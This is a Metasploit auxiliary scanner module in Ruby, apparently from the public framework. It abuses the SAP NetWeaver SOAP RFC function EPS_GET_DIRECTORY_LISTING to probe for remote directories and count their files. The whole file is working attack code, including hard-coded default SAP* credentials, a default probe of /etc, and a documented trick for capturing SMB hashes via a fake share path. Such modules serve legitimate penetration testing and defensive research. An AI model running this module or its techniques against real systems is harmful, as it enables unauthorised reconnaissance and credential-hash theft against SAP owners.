##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy.
#
# The following guys from ERP-SCAN deserve credit for their contributions -
# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and
# Dmitry Evdokimov.
#
# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis
# who have Beta tested the modules and provided excellent feedback. Some people
# just seem to enjoy hacking SAP :)
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure',
      'Description' => %q{
          This module abuses the SAP NetWeaver EPS_GET_DIRECTORY_LISTING function, on the
        SAP SOAP RFC Service, to check for remote directory existence and get the number
        of entries on it. The module can also be used to capture SMB hashes by using a fake
        SMB share as DIR.
      },
      'References' =>
        [
          [ 'URL', 'http://labs.mwrinfosecurity.com' ]
        ],
      'Author' =>
        [
          'nmonkee'
        ],
      'License' => MSF_LICENSE
    )

    register_options([
      Opt::RPORT(8000),
      OptString.new('CLIENT', [true, 'SAP Client', '001']),
      OptString.new('USERNAME', [true, 'Username', 'SAP*']),
      OptString.new('PASSWORD', [true, 'Password', '06071992']),
      OptString.new('DIR',[true,'Directory path (e.g. /etc)','/etc'])
    ], self.class)
  end

  def run_host(ip)
    data = '<?xml version="1.0" encoding="utf-8" ?>'
    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  '
    data << 'xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  '
    data << 'xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">'
    data << '<SOAP-ENV:Header/>'
    data << '<SOAP-ENV:Body>'
    data << '<EPS_GET_DIRECTORY_LISTING xmlns="urn:sap-com:document:sap:rfc:functions">'
    data << '<DIR_NAME>' + datastore['DIR'] + '</DIR_NAME>'
    data << '</EPS_GET_DIRECTORY_LISTING>'
    data << '</SOAP-ENV:Body>'
    data << '</SOAP-ENV:Envelope>'

    begin
      vprint_status("#{rhost}:#{rport} - Sending request to check #{datastore['DIR']}")
      res = send_request_cgi({
        'uri' => '/sap/bc/soap/rfc',
        'method' => 'POST',
        'data' => data,
        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
        'ctype' => 'text/xml; charset=UTF-8',
        'headers' => {
          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
        },
        'vars_get' => {
          'sap-client' => datastore['CLIENT'],
          'sap-language' => 'EN'
        }
      })
      if res and res.code == 200 and res.body =~ /EPS_GET_DIRECTORY_LISTING\.Response/ and res.body =~ /<FILE_COUNTER>(\d*)<\/FILE_COUNTER>/
        file_count = $1
        print_good("#{rhost}:#{rport} - #{file_count} files under #{datastore["DIR"]}")
      else
        vprint_error("#{rhost}:#{rport} - Error code: " + res.code.to_s) if res
        vprint_error("#{rhost}:#{rport} - Error message: " + res.message.to_s) if res
        vprint_error("#{rhost}:#{rport} - Error body: " + res.body.to_s) if res and res.body
      end
      rescue ::Rex::ConnectionError
        vprint_error("#{rhost}:#{rport} - Unable to connect")
        return
      end
    end
  end
